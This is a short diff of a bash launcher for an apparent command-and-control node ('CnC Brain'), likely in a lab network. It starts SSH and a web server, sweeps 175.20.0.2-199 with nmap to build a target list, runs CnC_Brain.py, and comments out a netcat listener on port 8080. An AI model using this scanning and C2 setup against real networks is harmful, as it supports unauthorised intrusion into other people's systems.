@@ -1,7 +1,7 @@
 #!/bin/bash
 #bash
 /etc/init.d/ssh start
-python3 /root/mount/webserver.py &
+python3 /root/mount/web_server.py &
 
 #### set to cut 14-25 for 3 digit IP's
 ip="$(ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -c 14-25)"
@@ -11,14 +11,15 @@ echo "CnC Brain"
 echo "----------------------------------------------------------"
 echo
 echo $ip
-#echo "$(ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -c 14-25 | xargs nmap)"
+# echo "$(ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -c 14-25 | xargs nmap)"
 mkdir /root/brain
+touch /root/brain/filehashes2.txt
 echo "Scanning for targets"
 nmap 175.20.0.2-199 -sn |awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' > /root/brain/targets.txt
 echo "Target list:"
 cat /root/brain/targets.txt
 echo "Beginning Brain Stuff"
-python3 /root/mount/CnC_Brain.py
+python3 /root/mount/CnC_Brain.py 3
 
-nc -lvp 8080
+# nc -lvp 8080
 bash
